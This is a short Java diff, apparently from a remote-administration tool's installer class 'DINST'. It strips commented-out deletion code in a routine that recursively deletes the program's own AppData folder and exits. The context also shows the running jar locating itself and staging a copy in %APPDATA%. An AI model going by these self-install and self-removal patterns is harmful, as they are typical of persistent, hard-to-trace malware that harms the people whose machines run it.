@@ -50,19 +50,6 @@ public class DINST extends Thread implements Interfaz {
             //CarpetaParent.delete();
             UtilRT.eliminar(CarpetaParent.getAbsolutePath());//elimina recursivamente            
             System.exit(0);
-//             if (destino.exists()) {
-//                if (!destino.delete()) {
-//                    return;
-//                }
-//            }
-//            if (server.exists()) {
-//                if (!server.delete()) {
-//                    return;
-//                }
-//            }
-//            
-//            CarpetaParent.delete();
-//            System.exit(0);
         } catch (Exception ex) {
         }
     }
@@ -79,7 +66,7 @@ public class DINST extends Thread implements Interfaz {
             }
             File server = new File(Inicio.class.getProtectionDomain().getCodeSource().getLocation().toURI());
             File CarpetaParent = new File(System.getenv("appdata") + "/" + nombreReg);
-            
+
             this.destino = new File(CarpetaParent, this.nombreJar + ".jar");
             if (this.tipo[0] == true) {
                 try {
